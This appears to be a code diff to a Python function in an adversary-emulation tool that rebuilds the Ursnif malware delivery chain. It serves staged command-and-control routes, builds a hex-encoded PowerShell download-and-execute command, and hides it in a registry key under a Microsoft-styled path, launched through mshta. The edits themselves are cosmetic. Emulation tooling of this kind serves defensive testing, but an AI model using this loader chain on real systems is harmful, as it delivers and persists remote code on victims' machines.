@@ -31,7 +31,6 @@ def ursnif(baseUrl) -> List[AceRoute]:
     serveHtml: AceRoute = makeAceRoute('/ursnif/c2-2', cmdline, info='Phase 3')
     routes.append(serveHtml)
 
-
     # Phase 2: A bat downloaded by itsIt.db
     # Will add reg1, reg2. Start mshta -> reg1 -> reg2 -> psScript:download&exec /ursnif/c2-2
 
@@ -39,7 +38,7 @@ def ursnif(baseUrl) -> List[AceRoute]:
     memoryJunk: AceStr = makePsScriptToCmdByDownloadCmd(baseUrl + '/ursnif/c2-2')
     memoryJunk = makePsCommandFromPsScript(memoryJunk)
     memoryJunk = bytes(memoryJunk, 'utf-8')
-    memoryJunk = hexlify(memoryJunk).decode('utf-8')
+    memoryJunk = AceStr(hexlify(memoryJunk).decode('utf-8'))
     memoryJunkRegAdd: AceStr = makeCmdAddReg(
         'HKCU\\Software\\AppDataLow\\Software\\Microsoft\\472A62F9-FA62-1196-3C6B-CED530CFE2D9',
         'MemoryJunk',
@@ -65,7 +64,6 @@ def ursnif(baseUrl) -> List[AceRoute]:
     ])
     serveHtml: AceRoute = makeAceRoute('/ursnif/c2', bat, info='Phase 2')
     routes.append(serveHtml)
-
 
     # Phase 1: the following are all in the ISO
     # itsIt.db DLL will download & exec from: /ursnif/c2
